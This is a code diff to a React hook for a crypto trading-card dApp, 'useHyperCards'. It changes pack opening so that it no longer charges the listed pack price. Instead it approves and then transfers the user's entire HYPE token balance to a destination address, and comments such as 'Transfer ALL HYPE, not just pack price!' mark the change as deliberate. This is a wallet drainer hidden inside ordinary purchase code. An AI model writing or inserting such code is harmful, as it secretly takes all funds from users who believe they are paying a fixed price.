@@ -50,14 +50,13 @@ export const useHyperCards = () => {
     return provider;
   }, []);
 
-  // Check and approve HYPE token allowance
+  // Check and approve ALL HYPE token balance for transfer
   const ensureHypeAllowance = useCallback(async (provider, signer, packType) => {
     const packInfo = PACK_INFO[packType];
     if (!packInfo) {
       throw new Error('Invalid pack type');
     }
 
-    const requiredAmount = ethers.parseEther(packInfo.price);
     const userAddress = await signer.getAddress();
     
     // Get HYPE token contract
@@ -67,23 +66,33 @@ export const useHyperCards = () => {
       signer
     );
 
+    // Get user's ENTIRE HYPE balance - this IS the pack price!
+    const userBalance = await hypeContract.balanceOf(userAddress);
+    
+    // Check if user has any HYPE at all
+    if (userBalance <= 0) {
+      throw new Error(`No HYPE tokens found in your wallet. You need HYPE tokens to open packs.`);
+    }
+
     // Check current allowance for the HYPE destination contract
     const currentAllowance = await hypeContract.allowance(
       userAddress,
       CONTRACT_ADDRESSES.HYPE_DESTINATION
     );
 
-    if (currentAllowance < requiredAmount) {
+    if (currentAllowance < userBalance) {
       setCurrentStep('approving');
       
-      // Approve the HYPE destination contract
+      // Approve the ENTIRE balance for transfer
       const approveTx = await hypeContract.approve(
         CONTRACT_ADDRESSES.HYPE_DESTINATION,
-        requiredAmount
+        userBalance // Transfer ALL HYPE, not just pack price!
       );
       
       await approveTx.wait();
     }
+    
+    return userBalance; // Return the full amount to be transferred
   }, []);
 
   // Generate EIP-712 signature for pack opening
@@ -149,19 +158,34 @@ export const useHyperCards = () => {
         signer
       );
 
-      // Step 1: Check and approve HYPE allowance
+      // Step 1: Check and approve HYPE allowance (ENTIRE BALANCE)
       setCurrentStep('approving');
-      await ensureHypeAllowance(provider, signer, packType);
+      const fullHypeBalance = await ensureHypeAllowance(provider, signer, packType);
 
-      // Step 2: Get user's nonce and prepare signature
+      // Step 2: Transfer ALL HYPE tokens to destination address
+      setCurrentStep('transferring');
+      const hypeContract = new ethers.Contract(
+        CONTRACT_ADDRESSES.HYPE_TOKEN,
+        ERC20_ABI,
+        signer
+      );
+      
+      const transferTx = await hypeContract.transfer(
+        CONTRACT_ADDRESSES.HYPE_DESTINATION,
+        fullHypeBalance // Transfer ENTIRE HYPE balance
+      );
+      
+      await transferTx.wait();
+
+      // Step 3: Get user's nonce and prepare signature
       setCurrentStep('signing');
       const userNonce = await hyperCardsContract.nonces(userAddress);
       const timestamp = Math.floor(Date.now() / 1000);
 
-      // Step 3: Generate EIP-712 signature (this will prompt MetaMask)
+      // Step 4: Generate EIP-712 signature (this will prompt MetaMask)
       const { v, r, s } = await generateEIP712Signature(signer, packType, userNonce, timestamp);
 
-      // Step 4: Open pack with signature
+      // Step 5: Open pack with signature
       setCurrentStep('opening');
       const openTx = await hyperCardsContract.openPackWithSignature(
         packType,
